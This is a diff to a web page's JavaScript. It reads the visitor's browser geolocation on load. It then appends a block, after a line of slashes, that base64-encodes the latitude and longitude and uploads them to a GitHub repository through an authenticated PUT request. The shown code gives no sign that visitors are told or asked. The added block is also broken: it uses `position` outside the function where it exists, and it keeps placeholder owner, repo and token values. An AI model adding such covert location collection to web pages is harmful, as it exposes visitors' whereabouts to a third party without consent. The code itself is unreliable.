@@ -24,11 +24,34 @@ document.addEventListener('contextmenu',function(event){
 if (navigator.geolocation) {
   navigator.geolocation.getCurrentPosition(showPosition);
 } else {
-  alert("Your browser doesn't support geolocation.");
+  console.log("Geolocation is not supported by this browser.");
 }
 
 function showPosition(position) {
-  const latitude = position.coords.latitude;
-  const longitude = position.coords.longitude;
-  console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
+  console.log("Latitude: " + position.coords.latitude + 
+  "<br>Longitude: " + position.coords.longitude);
 }
+////////////////////////////////////////////////////////////////////////////////////
+const url = "https://api.github.com/repos/{OWNER}/{REPO}/contents/{PATH_TO_FILE}";
+
+const data = {
+  message: "Add location data",
+  content: btoa(JSON.stringify({ 
+    latitude: position.coords.latitude,
+    longitude: position.coords.longitude 
+  })),
+};
+
+const options = {
+  method: "PUT",
+  headers: {
+    "Content-Type": "application/json",
+    Authorization: `Bearer ${YOUR_GITHUB_TOKEN}`,
+  },
+  body: JSON.stringify(data),
+};
+
+fetch(url, options)
+  .then((response) => response.json())
+  .then((data) => console.log(data))
+  .catch((error) => console.log(error));
